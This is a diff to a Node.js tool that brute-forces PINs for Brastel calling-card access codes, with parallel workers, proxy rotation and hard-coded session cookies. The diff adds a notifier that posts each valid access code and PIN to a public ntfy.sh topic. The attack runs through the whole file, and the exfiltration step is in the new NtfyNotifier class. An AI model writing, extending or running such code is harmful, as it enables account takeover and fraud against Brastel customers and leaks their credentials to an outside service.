@@ -8,6 +8,7 @@ const qs = require('qs');
 const fsSync = require('fs');
 const path = require('path');
 const { HttpsProxyAgent } = require('https-proxy-agent');
+const fetch = require('node-fetch');
 
 /**
  * Constants and enums
@@ -124,7 +125,15 @@ const CONFIG = {
     '_ga=GA1.2.2004863075.1749788627; ASP.NET_SessionId=kkmvt2y4ni0d4bp1sg0vz3xf; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; _gid=GA1.2.756149190.1750037918; ASPSESSIONIDCQDCDADQ=EMMPDBIDOPDCKJKJCDCMKLBJ; _gat=1',
     'ASPSESSIONIDCQDCDADQ=FMMPDBIDMJCOKDIBPHJPDCOP; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; ASP.NET_SessionId=jdjtcrz3ldwqknn0la2hglta; _ga=GA1.2.1880294636.1750065908; _gid=GA1.2.166709486.1750065908; _gat=1',
     'ASPSESSIONIDCQDCDADQ=FMMPDBIDMJCOKDIBPHJPDCOP; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; ASP.NET_SessionId=jdjtcrz3ldwqknn0la2hglta; _ga=GA1.2.1880294636.1750065908; _gid=GA1.2.166709486.1750065908; _gat=1; signInLangTrackEvent=50250189300514'
-  ]
+  ],
+
+  // Ntfy notification configuration
+  ntfy: {
+    enabled: true, // Set to false to disable ntfy notifications
+    server: 'https://ntfy.sh', // Ntfy server URL
+    topic: 'dhloc', // Topic to send notifications to
+    priority: '5' // Default priority (1-5, 5 is highest)
+  }
 };
 
 /**
@@ -568,6 +577,7 @@ class PinChecker {
     this.fileManager = fileManager;
     this.accessCode = accessCode;
     this.apiRequest = new ApiRequest(logger, proxyManager);
+    this.ntfyNotifier = new NtfyNotifier(logger);
     this.found = false;
     this.undefinedCount = 0; // Per-worker undefined counter
     this.shouldStopWorker = false; // Per-worker stop flag
@@ -614,7 +624,7 @@ class PinChecker {
    * @param {string} additionalInfo - Additional logging information (optional)
    * @returns {boolean} True if PIN is valid
    */
-  processResult(result, pin, workerId, additionalInfo = '') {
+  async processResult(result, pin, workerId, additionalInfo = '') {
     const logMessage = `Worker ${workerId} - PIN: ${pin} | Result: ${result.result} - ${result.errorMsg}`;
     const fullMessage = additionalInfo ? `${logMessage} | ${additionalInfo}` : logMessage;
 
@@ -633,6 +643,14 @@ class PinChecker {
       // Valid PIN found
       this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin}`);
       this.fileManager.addValidPin(pin);
+      
+      // Send ntfy notification
+      try {
+        await this.ntfyNotifier.sendPinFoundNotification(this.accessCode, pin, workerId);
+      } catch (error) {
+        this.logger.error(`Failed to send ntfy notification: ${error.message}`);
+      }
+      
       this.found = true;
       return true;
     }
@@ -666,7 +684,7 @@ class PinChecker {
 
         // Mark PIN as sent
         this.fileManager.addSentPin(pin);
-        return this.processResult(result, pin, workerId, additionalInfo);
+        return await this.processResult(result, pin, workerId, additionalInfo);
 
       } catch (error) {
         this.logger.error(`Worker ${workerId} - Error checking PIN ${pin} (attempt ${attempt}): ${error.message}`);
@@ -1009,6 +1027,86 @@ class BrastelPinChecker {
       console.error(`❌ Application error: ${error.message}`);
       throw error;
     }
+  }
+}
+
+/**
+ * Ntfy Notification Class
+ */
+class NtfyNotifier {
+  constructor(logger) {
+    this.logger = logger;
+    this.topic = CONFIG.ntfy.topic;
+    this.server = CONFIG.ntfy.server;
+    this.enabled = CONFIG.ntfy.enabled;
+  }
+
+  /**
+   * Sanitize text for HTTP headers (remove emojis and special characters)
+   * @param {string} text - Text to sanitize
+   * @returns {string} Sanitized text
+   */
+  sanitizeHeader(text) {
+    // Remove emojis and special characters that might cause HTTP header issues
+    return text.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{1F1E0}-\u{1F1FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, '')
+               .replace(/[^\x00-\x7F]/g, '') // Remove non-ASCII characters
+               .trim();
+  }
+
+  /**
+   * Send notification to ntfy
+   * @param {string} title - Notification title
+   * @param {string} message - Notification message
+   * @param {string} priority - Priority level (1-5, default: 4)
+   * @returns {Promise<boolean>} True if notification sent successfully
+   */
+  async sendNotification(title, message, priority = CONFIG.ntfy.priority) {
+    if (!this.enabled) {
+      this.logger.info('Ntfy notifications are disabled');
+      return false;
+    }
+
+    try {
+      const url = `${this.server}/${this.topic}`;
+      
+      // Sanitize title for HTTP header
+      const sanitizedTitle = this.sanitizeHeader(title);
+      
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'text/plain',
+          'Priority': priority,
+          'Title': sanitizedTitle
+        },
+        body: message
+      });
+
+      if (response.ok) {
+        this.logger.success(`Ntfy notification sent successfully: ${sanitizedTitle}`);
+        return true;
+      } else {
+        this.logger.error(`Failed to send ntfy notification: ${response.status} ${response.statusText}`);
+        return false;
+      }
+    } catch (error) {
+      this.logger.error(`Error sending ntfy notification: ${error.message}`);
+      return false;
+    }
+  }
+
+  /**
+   * Send PIN found notification
+   * @param {string} accessCode - Access code
+   * @param {string} pin - Valid PIN found
+   * @param {string} workerId - Worker ID that found the PIN
+   * @returns {Promise<boolean>} True if notification sent successfully
+   */
+  async sendPinFoundNotification(accessCode, pin, workerId) {
+    const title = 'Brastel PIN Found!'; // Removed emoji from title
+    const message = `🎯 Brastel PIN Found!\n\nAccess Code: ${accessCode}\nPIN: ${pin}\nWorker: ${workerId}\nTime: ${new Date().toLocaleString()}`;
+    
+    return await this.sendNotification(title, message, '5'); // High priority
   }
 }
 
